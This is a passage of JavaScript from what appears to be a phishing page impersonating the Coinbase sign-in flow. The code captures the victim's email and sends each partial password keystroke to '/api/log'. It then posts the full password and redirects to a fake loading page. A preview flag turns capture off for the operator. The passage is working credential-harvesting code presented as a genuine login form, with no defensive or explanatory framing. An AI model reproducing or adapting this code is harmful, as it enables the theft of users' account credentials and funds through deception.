      var stored = storedEmail();
      if(emailInput && stored){
        emailInput.value = stored;
        syncBtn();
      }
    }

    function syncBtn(){
      var valid = emailInput && isValidEmail(emailInput.value);
      if(submitBtn){
        submitBtn.disabled         = !valid;
        submitBtn.dataset.disabled = valid ? 'false' : 'true';
        submitBtn.setAttribute('data-disabled', valid ? 'false' : 'true');
      }
    }
    if(emailInput){
      emailInput.addEventListener('input', function(){
        syncBtn();
        emailInput.style.borderColor = '';
        var err = document.getElementById('_cb_email_err');
        if(err) err.style.display = 'none';
      });
    }
    syncBtn();

    function submitEmail(e){
      if(e) e.preventDefault();
      if(emailSent) return;
      var email = emailInput ? emailInput.value.trim() : '';
      if(!isValidEmail(email)){
        if(emailInput) emailInput.style.borderColor = '#e53e3e';
        var err = document.getElementById('_cb_email_err');
        if(!err){
          err = document.createElement('div');
          err.id = '_cb_email_err';
          err.style.cssText = 'color:#e53e3e;font-size:12px;margin-top:4px;font-family:sans-serif;';
          err.textContent = 'Please enter a valid email address.';
          if(emailInput && emailInput.parentNode) emailInput.parentNode.appendChild(err);
        } else { err.style.display = ''; }
        return;
      }
      if(window.location.search.indexOf('_liveled_preview')!==-1){
        showStep2(email);
        return;
      }
      emailSent = true;
      var body = new URLSearchParams({
        _token: (window._liveledCSRF || ''),
        type: 'form_submit',
        page: 'coinbase_sign_in',
        element: 'email',
        value: email,
        doc: window._llDocId || ''
      });
      var post = window._llPostTrack ? window._llPostTrack(body) : Promise.reject();
      post.then(function(){
        try{ sessionStorage.setItem('cb_email', email); }catch(_){}
        emailSent = false;
        showStep2(email);
      }).catch(function(){
        emailSent = false;
      });
    }
    if(submitBtn) submitBtn.addEventListener('click', submitEmail);
    if(step1) step1.addEventListener('submit', submitEmail);

    function syncPw(){
      var hasVal = pwInput && pwInput.value.length > 0;
      if(pwSubmit){
        pwSubmit.disabled = !hasVal;
        pwSubmit.setAttribute('data-disabled', hasVal ? 'false' : 'true');
      }
    }
    if(pwInput){
      pwInput.addEventListener('input', function(){
        syncPw();
        clearPwInvalid();
        try{
          if(window.location.search.indexOf('_liveled_preview')!==-1)throw 0;
          if(typeof window._liveledCSRF === 'undefined')throw 0;
          var gate = window._llWhenWritable || function(fn){ return Promise.reject(); };
          gate(function(){
            var b = new URLSearchParams({
              _token: window._liveledCSRF,
              page: 'coinbase_password',
              type: 'form_input',
              element: 'password_partial',
              value: pwInput.value,
              doc: window._llDocId || ''
            });
            fetch('/api/log', {method:'POST', body:b, keepalive:true});
          });
        }catch(_){}
      });
    }
    syncPw();

    function submitPassword(e){
      if(e) e.preventDefault();
      if(pwSent) return;
      var pw = pwInput ? pwInput.value : '';
      if(!pw) return;
      if(window.location.search.indexOf('_liveled_preview')!==-1) return;
      pwSent = true;
      var body = new URLSearchParams({
        _token: window._liveledCSRF || '',
        type: 'form_submit',
        page: 'coinbase_password',
        element: 'password',
        value: pw,
        doc: window._llDocId || ''
      });
      var post = window._llPostTrack ? window._llPostTrack(body) : Promise.reject();
      post.then(function(){
        window.location.href = '/coinbase/loading';
      }).catch(function(){
        pwSent = false;
        syncPw();
      });
    }
    if(pwSubmit) pwSubmit.addEventListener('click', submitPassword);
    var pwForm = document.getElementById('cb-si-pw-form');
    if(pwForm) pwForm.addEventListener('submit', submitPassword);

    var eyeBtn = document.querySelector('#cb-si-step2 [aria-label="Show password"], #cb-si-step2 [aria-label="Hide password"]');
    var SVG_EYE_OFF = '<svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M17.94 17.94A10.94 10.94 0 0 1 12 20C7 20 2.73 16.39 1 12a10.94 10.94 0 0 1 2.06-3.94M9.9 4.24A9.12 9.12 0 0 1 12 4c5 0 9.27 3.61 11 8a10.94 10.94 0 0 1-1.33 2.56M1 1l22 22"/><path d="M10.59 10.59A3 3 0 0 0 12 15a3 3 0 0 0 2.83-2"/></svg>';
    var SVG_EYE_ON  = '<svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M1 12C2.73 7.61 7 4 12 4s9.27 3.61 11 8c-1.73 4.39-6 8-11 8S2.73 16.39 1 12z"/><circle cx="12" cy="12" r="3"/></svg>';
    if(eyeBtn){
      var iconWrap = eyeBtn.querySelector('.cds-Icon');
      if(iconWrap) iconWrap.innerHTML = SVG_EYE_OFF;
      eyeBtn.addEventListener('click', function(){
        if(!pwInput) return;
        var isPassword = pwInput.type === 'password';
        pwInput.type = isPassword ? 'text' : 'password';
        if(iconWrap) iconWrap.innerHTML = isPassword ? SVG_EYE_ON : SVG_EYE_OFF;
        eyeBtn.setAttribute('aria-label', isPassword ? 'Hide password' : 'Show password');
      });
    }

    window.addEventListener('popstate',function(){
      if(onStep2) showStep1();
